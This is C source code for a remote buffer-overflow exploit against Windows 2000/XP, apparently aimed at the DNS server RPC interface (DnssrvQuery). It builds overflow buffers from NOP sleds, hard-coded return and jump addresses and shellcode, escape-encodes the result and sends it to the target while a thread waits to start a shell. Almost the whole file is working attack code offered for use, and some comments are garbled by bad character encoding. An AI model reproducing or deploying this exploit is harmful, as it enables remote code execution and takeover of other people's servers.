
#pragma  comment(lib,"ole32.lib")

int  getoverbuffwin2k(char *overbuff)
{
        #define  OVERADD  0x1d1
        #define  EBXADD   OVERADD+0x2e0
	    
        int     i,j,k,l;
        char    buffer2[BUFFSIZE];
      	
        memset(buffer2,	NOPCODE,BUFFSIZE);

					
		for(i=OVERADD+offset;i<OVERADD+0x30+offset;i+=0x4)
        {
		      memcpy(buffer2+i,eipretwinxp,4); 
        }

	   memcpy(buffer2+i-4,eipjmpespwinxp,4);  

	   
  	   j=GetFindShellcode(buffer2+i+0x40);	
	   j+=i;
	   j+=4;


	   for(i=EBXADD+offset;i<EBXADD+0x30+offset;i+=0x8)
        {
		      memcpy(buffer2+i,"\x4f\x4f\x4f\x2d",4); 
		      memcpy(buffer2+i+4,eipjmpebxwin2000all,4); 
        }

	   memcpy(buffer2+i+4,"\xe9\x20\xfd\xff\xff\x00",6); 

	  

 	   j=i+0x10;
	   
	   memcpy(overbuff,buffer2,j);  
  
       return j;   //strlen(overbuff);
}


int  getoverbuffwinxp(char *overbuff)
{
     #define  OVERADD  0x7e0
	   
        int     i,j,k,l;
        char    buffer2[BUFFSIZE];
      	char    jmpshellcode[]="\xe9\xd0\x07\x00\x00";
		char    jmpnextshell[]="\xff\x64\x24\x14";  // jmp dword ptr [esp+14]
        
		
        memset(buffer2,NOPCODE,BUFFSIZE);

//		memcpy(buffer2,jmpshellcode,5);
  //  	j=GetShellcode(buffer2+4);		

				
		for(i=OVERADD+offset;i<OVERADD+0x18+offset;i+=0x4)
        {
		      memcpy(buffer2+i,eipretwin2000,4); 
//			  memcpy(buffer2+i,eipjmpesiwin2000,4);  
        }

//		 memcpy(buffer2+i,eipjmpespwin2000,4);  
/*
		for(;i<OVERADD+0x20+offset;i+=0x4)
        {
		    memcpy(buffer2+i,jmpnextshell,4);  
        }
		
*/
//			j=GetFindShellcode(buffer2+i+0x10);	

//			j=j+i+0x10;
		memcpy(overbuff,buffer2,i);  
   //     strcpy(buffer2+i+4+j,jmpshellcode);

//        strcpy(overbuff,buffer2);

        return i;   //strlen(overbuff);
}



int  getoverbuff2(char *overbuff)
{

        #define  OVERADD  0x18 //0x10
        int     i,j;
       
        char    shellcodebuff[BUFFSIZE];
    
		strcpy(shellcodebuff,"55556666");
		j=GetShellcode(shellcodebuff+8);
		strcat(shellcodebuff,"66665555");
		

	
  strcpy(overbuff,shellcodebuff);
  return  strlen(shellcodebuff);
}


int  GetOverStr(char *buffer)
{

//  ACTIVATION_PARAMS act;
  char    overbuff[BUFFSIZE];
  int     findshellbytes,postbytes;

  int     i;

   i=getoverbuffwin2k(overbuff);
//  findshellbytes=GetFindShellcode(findshellcodebuff);
    
  memcpy(buffer,overbuff,i+1);
  return i;
}


void sendoverpack()
{

    int     i,j,k;
	char    winxpbuff[BUFFSIZE];
	char    win2kbuff[BUFFSIZE];
	char    shellcode[BUFFSIZE];
	char    buff2[0x20];

	unsigned char    temp;

	char    buff9[0x20c+4];
	char    buffa[0x20c+4];
    
	FARPROC  test2k;

    char    *buffstr=winxpbuff;

	i=RpcSendRecv("rpcd\x00",5,winxpbuff,BUFFSIZE);
    if(i!=0)
	{

		j=getoverbuffwin2k(winxpbuff);
		memset(winxpbuff+j+1,0,4);
         
		for(k=0,i=0;i<j;++i,k+=2)
		{
			temp=winxpbuff[i];
			if(temp>='0'&&temp<='7')
			{

				/*
				 8½øÖÆ±àÂë
                 '0'    30     11 0000   110 000   '60'   
			     '7'    37     11 0111   110 111   "67'
                */

              win2kbuff[k]='\\';
			  win2kbuff[k+1]='6';
			  win2kbuff[k+2]=temp;
			  k++;
			}
			else 
			{
              win2kbuff[k]='\\';
			  if(temp==0) temp='0';
			  win2kbuff[k+1]=temp;
			}

		}

		getoverbuff2(shellcode);
		CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)shellcmd,0,0,&i); 
		i=DnssrvQuery(0,win2kbuff,shellcode);

	    }

	else shellcmd();

}




